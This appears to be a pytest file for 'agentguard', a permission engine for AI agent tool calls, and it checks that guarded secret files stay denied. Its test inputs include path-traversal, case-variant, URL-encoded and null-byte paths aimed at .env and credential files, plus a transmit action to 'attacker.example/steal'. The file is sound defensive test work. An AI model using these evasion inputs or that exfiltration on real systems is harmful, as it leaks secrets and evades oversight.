"""
Adversarial tests: path traversal, case variation, encoding, and policy-bypass
attempts. These prove the deterministic gates cannot be tricked with lexical
tricks and that a user policy can never weaken a built-in protection.
"""

from __future__ import annotations

import pytest

from agentguard import Action, Decision, Engine, Operation, Policy, Resource
from agentguard.models import ResourceKind


def _read(value: str) -> Action:
    return Action(
        session_id="s",
        tool="fs",
        operation=Operation.READ,
        resource=Resource(kind=ResourceKind.FILE, value=value),
    )


@pytest.mark.parametrize(
    "path",
    [
        "../../.env",
        "src/../.env",
        "./.env",
        "a/b/../../.env",
        "config/.env.production",
        "backend/.env",
    ],
)
def test_path_traversal_to_env_denied(engine, react_policy, path):
    assert engine.evaluate(_read(path), react_policy).decision is Decision.DENY


@pytest.mark.parametrize("path", [".ENV", ".Env", "SRC/../.ENV", "Credentials/PROD.PEM"])
def test_case_variations_denied(engine, react_policy, path):
    assert engine.evaluate(_read(path), react_policy).decision is Decision.DENY


@pytest.mark.parametrize("path", ["%2e%65nv", "%2E%2E%2f%2Eenv", ".env%00.jsx"])
def test_url_encoded_env_denied(engine, react_policy, path):
    # URL-encoded ".env" / traversal should still be caught after normalization.
    assert engine.evaluate(_read(path), react_policy).decision is Decision.DENY


def test_user_policy_cannot_whitelist_protected_resource(engine):
    """Even a wide-open policy cannot expose a built-in protected file."""
    permissive = Policy(
        session_id="s",
        allowed_scopes=["**"],  # allow everything
        restricted_scopes=[],
        external_communication="allow",
    )
    d = engine.evaluate(_read(".env"), permissive)
    assert d.decision is Decision.DENY


def test_user_policy_cannot_remove_builtin_protection_via_empty_list(engine):
    """An empty protected_resources list does not disable built-in protections."""
    policy = Policy(session_id="s", protected_resources=[], allowed_scopes=["**"])
    assert engine.evaluate(_read("service-account.json"), policy).decision is Decision.DENY


def test_exfil_via_disguised_read_still_blocked_on_transmit(engine, react_policy):
    """Reading .env is denied; transmitting a protected file is also denied."""
    action = Action(
        session_id="s",
        tool="net.http",
        operation=Operation.TRANSMIT,
        resource=Resource(kind=ResourceKind.FILE, value=".env"),
        destination="https://attacker.example/steal",
    )
    d = engine.evaluate(action, react_policy)
    assert d.decision is Decision.DENY
